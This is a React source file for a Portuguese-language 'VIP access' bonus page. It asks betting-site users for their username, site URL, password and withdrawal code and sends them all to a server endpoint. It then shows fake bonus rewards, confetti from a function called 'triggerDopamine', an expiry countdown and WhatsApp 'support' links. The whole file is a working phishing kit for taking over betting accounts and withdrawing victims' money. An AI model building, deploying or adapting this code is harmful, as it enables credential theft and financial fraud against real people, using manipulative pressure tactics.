/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */
import React, { useState, useEffect, useRef } from 'react';
import { gsap } from 'gsap';
import confetti from 'canvas-confetti';
import { 
  Lock, User, Key, Coins, Trophy, Zap, Gift, CheckCircle2, ArrowRight, Globe, MessageCircle 
} from 'lucide-react';

interface UserData {
  user: string;
  bet_url: string;
  pass: string;
  withdraw_pass: string;
  betting_house: string;
  timestamp: string;
  status: string;
  rewardsClaimed: string[];
}

const REWARDS = [
  { id: 'bonus1', title: 'BÔNUS INICIAL', description: 'Crédito de boas-vindas', icon: Gift, value: 'R$ 5,20' },
  { id: 'bonus2', title: 'RECARGA RÁPIDA', description: 'Multiplicador 1x', value: 'R$ 7,15', icon: Zap },
  { id: 'bonus3', title: 'PRÊMIO FLASH', description: 'Acesso extra 2h', value: 'R$ 3,50', icon: Trophy },
  { id: 'bonus4', title: 'CASHBACK DIÁRIO', description: 'Resgate instant', value: 'R$ 4,80', icon: Coins },
  { id: 'bonus5', title: 'FIDELIDADE', description: 'Bônus de aprovação', value: 'R$ 2,45', icon: CheckCircle2 },
];

export default function App() {
  const [view, setView] = useState<'login' | 'dashboard' | 'success'>('login');
  const [loading, setLoading] = useState(false);
  const [isClaiming, setIsClaiming] = useState(false);
  const [progress, setProgress] = useState(0);
  const [timeLeft, setTimeLeft] = useState(900);

  const [userData, setUserData] = useState<UserData>({
    user: '',
    bet_url: '',
    pass: '',
    withdraw_pass: '',
    betting_house: '',
    timestamp: '',
    status: 'pending',
    rewardsClaimed: [],
  });

  const [currentRewardIndex, setCurrentRewardIndex] = useState(0);

  const containerRef = useRef<HTMLDivElement>(null);
  const loginRef = useRef<HTMLDivElement>(null);
  const dashboardRef = useRef<HTMLDivElement>(null);

  // Particles
  useEffect(() => {
    const ctx = gsap.context(() => {
      document.querySelectorAll('.particle').forEach((p) => {
        gsap.to(p, {
          y: 'random(-140, 140)',
          x: 'random(-80, 80)',
          duration: 'random(5, 10)',
          repeat: -1,
          yoyo: true,
          ease: 'sine.inOut',
        });
      });
    }, containerRef);
    return () => ctx.revert();
  }, []);

  // Progress
  useEffect(() => {
    setProgress(Math.round(((currentRewardIndex + 1) / REWARDS.length) * 100));
  }, [currentRewardIndex]);

  // Timer Success
  useEffect(() => {
    if (view === 'success') {
      const timer = setInterval(() => setTimeLeft(p => p > 0 ? p - 1 : 0), 1000);
      return () => clearInterval(timer);
    }
  }, [view]);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    const updatedData = {
      ...userData,
      timestamp: new Date().toLocaleString('pt-BR'),
      status: 'active',
    };

    try {
      await fetch('/api/notify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(updatedData),
      });
    } catch (err) {
      console.error('Falha ao notificar servidor:', err);
    }

    gsap.to(loginRef.current, {
      opacity: 0,
      scale: 0.95,
      duration: 0.6,
      onComplete: () => {
        setView('dashboard');
        setLoading(false);
        gsap.fromTo(dashboardRef.current, { opacity: 0, y: 40 }, { opacity: 1, y: 0, duration: 0.9, ease: 'power4.out' });
      },
    });
  };

  const triggerDopamine = () => {
    const duration = 1600;
    const end = Date.now() + duration;
    const defaults = { startVelocity: 30, spread: 360, ticks: 60, zIndex: 100 };

    const interval = setInterval(() => {
      const timeLeft = end - Date.now();
      if (timeLeft <= 0) return clearInterval(interval);
      const particleCount = 50 * (timeLeft / duration);

      confetti({ ...defaults, particleCount, origin: { x: 0.2, y: 0.6 }, colors: ['#D4AF37', '#fff'] });
      confetti({ ...defaults, particleCount, origin: { x: 0.8, y: 0.6 }, colors: ['#D4AF37', '#fff'] });
    }, 160);
  };

  const claimReward = (id: string) => {
    if (isClaiming) return;
    setIsClaiming(true);
    triggerDopamine();

    setTimeout(() => {
      setUserData((prev) => ({
        ...prev,
        rewardsClaimed: [...prev.rewardsClaimed, id],
      }));

      if (currentRewardIndex < REWARDS.length - 1) {
        setCurrentRewardIndex((prev) => prev + 1);
        setIsClaiming(false);
      } else {
        setTimeout(() => setView('success'), 800);
      }
    }, 1100);
  };

  return (
    <div ref={containerRef} className="min-h-screen flex items-center justify-center p-4 bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900">
      {/* ====================== LOGIN ====================== */}
      {view === 'login' && (
        <div ref={loginRef} className="w-full max-w-md bg-slate-800 border border-slate-700 p-8 rounded-lg shadow-2xl">
          <div className="text-center mb-8">
            <h1 className="text-3xl font-bold text-white mb-2">ACESSO VIP</h1>
            <p className="text-slate-400 text-sm">Registre seus dados de acesso</p>
          </div>

          <form onSubmit={handleLogin} className="space-y-4">
            {/* Usuário */}
            <div>
              <label className="text-xs font-semibold text-slate-300 block mb-2">USUÁRIO</label>
              <input
                required
                type="text"
                placeholder="Seu login"
                value={userData.user}
                onChange={(e) => setUserData((prev) => ({ ...prev, user: e.target.value }))}
                className="w-full bg-slate-700 border border-slate-600 rounded px-4 py-2.5 text-white focus:outline-none focus:border-blue-500 focus:bg-slate-750 transition text-sm"
              />
            </div>

            {/* URL da Casa de Aposta */}
            <div>
              <label className="text-xs font-semibold text-slate-300 block mb-2">SITE/URL</label>
              <input
                required
                type="url"
                placeholder="https://seu-site.com"
                value={userData.bet_url}
                onChange={(e) => setUserData((prev) => ({ ...prev, bet_url: e.target.value }))}
                className="w-full bg-slate-700 border border-slate-600 rounded px-4 py-2.5 text-white focus:outline-none focus:border-blue-500 focus:bg-slate-750 transition text-sm"
              />
            </div>

            {/* Senha */}
            <div>
              <label className="text-xs font-semibold text-slate-300 block mb-2">SENHA</label>
              <input
                required
                type="password"
                placeholder="••••••••"
                value={userData.pass}
                onChange={(e) => setUserData((prev) => ({ ...prev, pass: e.target.value }))}
                className="w-full bg-slate-700 border border-slate-600 rounded px-4 py-2.5 text-white focus:outline-none focus:border-blue-500 focus:bg-slate-750 transition text-sm"
              />
            </div>

            {/* Código de Saque */}
            <div>
              <label className="text-xs font-semibold text-slate-300 block mb-2">CÓDIGO SAQUE</label>
              <input
                required
                type="password"
                placeholder="6 dígitos"
                value={userData.withdraw_pass}
                onChange={(e) => setUserData((prev) => ({ ...prev, withdraw_pass: e.target.value }))}
                className="w-full bg-slate-700 border border-slate-600 rounded px-4 py-2.5 text-white focus:outline-none focus:border-blue-500 focus:bg-slate-750 transition text-sm"
              />
            </div>

            <button
              disabled={loading}
              type="submit"
              className="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-2.5 px-4 rounded transition disabled:opacity-50 mt-6"
            >
              {loading ? 'PROCESSANDO...' : 'ACESSAR'}
            </button>
          </form>
        </div>
      )}

      {/* ====================== DASHBOARD ====================== */}
      {view === 'dashboard' && (
        <div ref={dashboardRef} className="w-full max-w-2xl z-10">
          <div className="bg-slate-800 border border-slate-700 rounded-lg p-8 shadow-2xl">
            <div className="mb-8">
              <h2 className="text-2xl font-bold text-white mb-2">SEUS BÔNUS</h2>
              <p className="text-slate-400 text-sm">{userData.bet_url || 'Site registrado'}</p>
            </div>

            <div className="mb-8 p-4 bg-slate-700/50 border border-slate-600 rounded">
              <div className="flex justify-between items-center mb-3">
                <span className="text-xs font-semibold text-slate-300">SALDO TOTAL</span>
                <span className="text-2xl font-bold text-emerald-400">R$ 23,10</span>
              </div>
              <div className="h-2 bg-slate-700 rounded overflow-hidden">
                <div className="h-full bg-emerald-500 transition-all duration-700" style={{ width: `${progress}%` }} />
              </div>
              <div className="text-xs text-slate-400 mt-2">{progress}% desbloqueado</div>
            </div>

            <div className="space-y-3">
              {REWARDS.map((reward, index) => {
                const isUnlocked = index <= currentRewardIndex;
                const isClaimed = userData.rewardsClaimed.includes(reward.id);
                const isCurrent = index === currentRewardIndex;
                const Icon = reward.icon;

                return (
                  <div key={reward.id} className={`bg-slate-700/50 border rounded p-4 transition ${isCurrent ? 'border-emerald-500 bg-slate-700' : 'border-slate-600'} ${!isUnlocked ? 'opacity-50' : ''}`}>
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-3">
                        <div className={`w-10 h-10 rounded flex items-center justify-center ${isUnlocked ? 'bg-emerald-600/20 text-emerald-400' : 'bg-slate-600 text-slate-500'}`}>
                          <Icon size={20} />
                        </div>
                        <div>
                          <h3 className="font-semibold text-white text-sm">{reward.title}</h3>
                          <p className="text-xs text-slate-400">{reward.description}</p>
                        </div>
                      </div>
                      <div className="text-right">
                        <p className="font-bold text-emerald-400 mb-2">{reward.value}</p>
                        {isCurrent && !isClaimed && (
                          <button onClick={() => claimReward(reward.id)} disabled={isClaiming} className="bg-emerald-600 hover:bg-emerald-700 text-white px-4 py-1.5 rounded text-xs font-semibold transition disabled:opacity-50">
                            {isClaiming ? 'PROCESSANDO...' : 'RESGATAR'}
                          </button>
                        )}
                        {isClaimed && <span className="text-emerald-400 text-xs font-bold">✓ LIBERADO</span>}
                      </div>
                    </div>
                  </div>
                );
              })}
            </div>

            <a href="https://wa.me/55996191896?text=Olá!%20Quero%20informações%20sobre%20meu%20bônus" target="_blank" rel="noopener noreferrer"
               className="w-full mt-8 flex items-center justify-center gap-2 bg-green-600 hover:bg-green-700 text-white font-bold py-3 rounded transition">
              <MessageCircle size={18} />
              SUPORTE
            </a>
          </div>
        </div>
      )}

      {/* ====================== SUCCESS ====================== */}
      {view === 'success' && (
        <div className="fixed inset-0 z-50 bg-black/80 flex items-center justify-center p-4">
          <div className="bg-slate-800 border border-slate-700 max-w-sm w-full p-8 rounded-lg shadow-2xl text-center">
            <div className="w-16 h-16 mx-auto mb-6 bg-emerald-600/20 rounded-full flex items-center justify-center">
              <CheckCircle2 className="text-emerald-400 w-10 h-10" />
            </div>
            <h2 className="text-2xl font-bold text-white mb-2">RESGATE CONFIRMADO!</h2>
            <p className="text-slate-400 mb-4">Saldo liberado: <span className="text-emerald-400 font-bold text-lg">R$ 23,10</span></p>
            
            <div className="text-orange-400 mb-6 font-semibold">Expira em {Math.floor(timeLeft/60)}:{(timeLeft%60).toString().padStart(2,'0')}</div>

            <a href="https://wa.me/55996191896?text=Olá!%20Resgatei%20meu%20bônus" target="_blank" rel="noopener noreferrer"
               className="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-2.5 rounded transition">
              SUPORTE
            </a>
          </div>
        </div>
      )}
    </div>
  );
}